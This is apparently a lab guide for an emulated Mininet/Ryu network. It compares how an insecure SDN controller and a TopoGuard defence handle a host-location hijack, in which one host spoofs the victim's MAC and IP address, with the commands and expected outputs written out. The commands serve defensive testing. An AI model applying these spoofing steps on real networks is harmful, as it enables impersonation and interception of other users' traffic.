# Host Location Hijacking Attack Test (Manual First)

This guide shows how to run the same host-location hijacking (MAC move spoof) attack manually against:

1. `insecure_baseline_ryu.py` (expected to be vulnerable)
2. `topoguard_ryu.py` (expected to defend)

At the end, you can run `hlh_auto.py` to automate the same A/B test.

## Test Setup

Use two terminals from `topoguard-ryu`:

- Terminal A: controller (`ryu-manager ...`)
- Terminal B: Mininet (`sudo python3 topology.py`)

Topology used:

- `h1`, `h2` on `s1`
- `h3` on `s2`
- Victim identity is `h2` (`10.0.0.2`, `00:00:00:00:00:02`)
- Attack source is `h1` (spoofs victim MAC)

## 1) Manual Test on Insecure Baseline

## Why there are so many commands

This test is written to be *deterministic* and match what `hlh_auto.py` does, not to be minimal.

In particular, the flow-table cleanup/reset is done multiple times because each phase is trying to measure a different thing:

- **Before the pre-check**: remove any residual dataplane rules so the controller re-learns in a known state.
- **Right after the spoof**: force a fresh (re)learn under the attacker’s forged identity (this is the actual “attack trigger”).
- **Before the post-check**: ensure the flows you dump/observe were installed *after* the spoof and aren’t leftovers.

If you only care about “does it hijack?” and don’t need strict reproducibility, you can skip some resets (see **Quick variant** below).

### Terminal A (controller)

```bash
ryu-manager insecure_baseline_ryu.py
```

### Terminal B (Mininet)

```bash
sudo python3 topology.py
```

Inside Mininet CLI, run:

```bash

# Pre-attack check
h2 ping -c 2 10.0.0.3
h3 arp -s 10.0.0.2 00:00:00:00:00:02
h3 ping -c 2 10.0.0.2
sh ovs-ofctl -O OpenFlow13 dump-flows s1 | grep "dl_dst=00:00:00:00:00:02"

# Host-location hijack: h1 spoofs h2 MAC and claim victim IP
h1 ip link set dev h1-eth0 down
h1 ip link set dev h1-eth0 address 00:00:00:00:00:02
h1 ip link set dev h1-eth0 up
h1 ip addr add 10.0.0.2/24 dev h1-eth0

# Recompute and post-attack checks
sh ovs-ofctl -O OpenFlow13 del-flows s1; ovs-ofctl -O OpenFlow13 del-flows s2; ovs-ofctl -O OpenFlow13 add-flow s1 "priority=0,actions=CONTROLLER:65535"; ovs-ofctl -O OpenFlow13 add-flow s2 "priority=0,actions=CONTROLLER:65535"
h1 ping -c 8 -i 0.05 -W 1 10.0.0.3
h3 ping -c 3 10.0.0.2
sh ovs-ofctl -O OpenFlow13 dump-flows s1 | grep "dl_dst=00:00:00:00:00:02"


### Expected Output (Baseline)

- `pre` (before attack): low packet loss (usually `0%`).
- `post` (after attack): flow output for `dl_dst=00:00:00:00:00:02` on `s1` can include attacker-side port.
- With impersonation enabled on attacker, ping to `10.0.0.2` may still succeed even though traffic is hijacked.
- Baseline controller log does not report TopoGuard host-move violations.

Exit Mininet with `exit`, then clean up before the next run:

```bash
sudo mn -c
```

Stop the controller in Terminal A with `Ctrl+C`.

## 2) Manual Test on TopoGuard

### Terminal A (controller)

```bash
ryu-manager topoguard_ryu.py
```

### Terminal B (Mininet)

```bash
sudo python3 topology.py
```

Inside Mininet CLI, run the same sequence:

```bash
# Pre-attack check
h2 ping -c 2 10.0.0.3
h3 arp -s 10.0.0.2 00:00:00:00:00:02
h3 ping -c 2 10.0.0.2
sh ovs-ofctl -O OpenFlow13 dump-flows s1 | grep "dl_dst=00:00:00:00:00:02"

# Host-location hijack: h1 spoofs h2 MAC and claim victim IP
h1 ip link set dev h1-eth0 down
h1 ip link set dev h1-eth0 address 00:00:00:00:00:02
h1 ip link set dev h1-eth0 up
h1 ip addr add 10.0.0.2/24 dev h1-eth0

# Recompute and post-attack checks
sh ovs-ofctl -O OpenFlow13 del-flows s1; ovs-ofctl -O OpenFlow13 del-flows s2; ovs-ofctl -O OpenFlow13 add-flow s1 "priority=0,actions=CONTROLLER:65535"; ovs-ofctl -O OpenFlow13 add-flow s2 "priority=0,actions=CONTROLLER:65535"
h1 ping -c 8 -i 0.05 -W 1 10.0.0.3
h3 ping -c 3 10.0.0.2
sh ovs-ofctl -O OpenFlow13 dump-flows s1 | grep "dl_dst=00:00:00:00:00:02"
```

### Expected Output (TopoGuard)

- `pre` (before attack): low packet loss (usually `0%`).
- `post` (after attack): victim reachability remains low-loss and `s1` flow output for victim MAC stays on victim-side path (no attacker-port takeover).
- Controller log records host-move violation, for example:

```text
Violation: Host Move from switch ... port ... without Port ShutDown
```

## 3) Automatic A/B Test

After the manual runs above, you can execute the automated comparison:

```bash
sudo python3 hlh_auto.py
```

It prints:

- baseline `pre`/`post` packet-loss percentages
- baseline `pre_outputs`/`post_outputs` for victim MAC flow on `s1`
- topoguard `pre`/`post` packet-loss percentages
- topoguard `pre_outputs`/`post_outputs` and host-move violation detection
- final `result=PASS` or `result=FAIL`
